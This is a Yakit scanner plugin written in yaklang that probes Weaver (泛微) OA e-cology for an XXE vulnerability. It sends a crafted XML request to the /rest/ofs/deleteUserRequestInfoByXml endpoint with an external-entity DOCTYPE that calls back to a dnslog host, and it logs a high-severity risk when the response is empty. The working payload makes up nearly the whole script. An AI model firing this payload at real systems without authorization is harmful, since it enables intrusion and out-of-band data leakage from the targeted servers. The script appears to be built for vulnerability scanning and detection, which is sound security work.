script_name: 泛微 OA e-cology XXE漏洞
content:
yakit.AutoInitYakit()
loglevel("info")

handleCheck = func(addr){
    isTls = str.IsTLSServer(addr)
    packet1 = `
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: {{params(target)}}
Content-Type: application/xml

1`
    rsp1,req1,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    )
    packet = `
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: {{params(target)}}
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://{{params(rand)}}.{{params(ip)}}.{{params(dnslog)}}">
<M><syscode>&send;</syscode></M>`    
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"ip": ip, "target": addr, "dnslog": dnslogurl, "rand": string(randn(1000,99999))}),
    poc.https(isTls),
    )
    //dump(rsp)
    if len(rsp) == 0 {
        risk.NewRisk(
            target, risk.severity("high"), 
            risk.title(f"泛微 OA e-cology XXE漏洞"),
            risk.titleVerbose("weaver oa e-cology XXE"),
            risk.type("xxe"),
            risk.request(req),
            risk.response(rsp),
            risk.details({
                "packet":string(packet),
                "payload":"<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE syscode SYSTEM \"http://{{params(rand)}}.{{params(ip)}}.{{params(dnslog)}}\"><M><syscode>&send;</syscode></M>",
            }),
        )
    }
    return
}

target = cli.String("root_url")
dnslogurl = cli.String("dnslogurl")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
params: "[{\"Field\":\"root_url\",\"DefaultValue\":\"注意此插件需要结合dnslog判断漏洞 例如：https://www.baidu.com/\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"root_url\",\"Help\":\"root_url\",\"Required\":true},{\"Field\":\"dnslogurl\",\"DefaultValue\":\"注意此插件需要结合dnslog判断漏洞 例如：1.eyes.sh\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"dnslogurl\",\"Help\":\"dnslogurl\",\"Required\":true}]"
